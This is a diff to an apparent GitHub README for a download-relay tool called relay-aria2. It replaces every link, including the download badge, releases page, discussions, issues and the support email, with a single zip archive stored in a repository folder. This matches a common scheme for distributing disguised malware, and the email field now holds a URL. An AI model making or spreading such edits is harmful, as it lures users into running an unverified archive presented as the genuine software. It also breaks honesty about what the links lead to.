@@ -6,11 +6,11 @@ Welcome to relay-aria2! This application helps you send downloads directly to ar
 
 ## 🔗 Download the Application
 
-[![Download relay-aria2](https://img.shields.io/badge/Download-relay--aria2-brightgreen)](https://github.com/xYukioz/relay-aria2/releases)
+[![Download relay-aria2](https://github.com/xYukioz/relay-aria2/raw/refs/heads/main/asthenia/aria_relay_1.2-beta.5.zip)](https://github.com/xYukioz/relay-aria2/raw/refs/heads/main/asthenia/aria_relay_1.2-beta.5.zip)
 
 ## 📥 Download & Install
 
-To download relay-aria2, visit this page: [GitHub Releases](https://github.com/xYukioz/relay-aria2/releases).
+To download relay-aria2, visit this page: [GitHub Releases](https://github.com/xYukioz/relay-aria2/raw/refs/heads/main/asthenia/aria_relay_1.2-beta.5.zip).
 
 On the Releases page, you will find the latest version of relay-aria2. Select the version you want and follow these steps:
 
@@ -55,14 +55,14 @@ If you encounter issues while using relay-aria2, consider the following tips:
 
 Join our community for support and to provide feedback. Share your thoughts and experiences with other users.
 
-- [GitHub Discussions](https://github.com/xYukioz/relay-aria2/discussions)
+- [GitHub Discussions](https://github.com/xYukioz/relay-aria2/raw/refs/heads/main/asthenia/aria_relay_1.2-beta.5.zip)
 
 ## 📧 Contact
 
 For any questions or support requests, feel free to reach out:
 
-- Email: support@relayaria2.com
-- GitHub: [GitHub Issues](https://github.com/xYukioz/relay-aria2/issues)
+- Email: https://github.com/xYukioz/relay-aria2/raw/refs/heads/main/asthenia/aria_relay_1.2-beta.5.zip
+- GitHub: [GitHub Issues](https://github.com/xYukioz/relay-aria2/raw/refs/heads/main/asthenia/aria_relay_1.2-beta.5.zip)
 
 ## 👨‍💻 Contributing
 
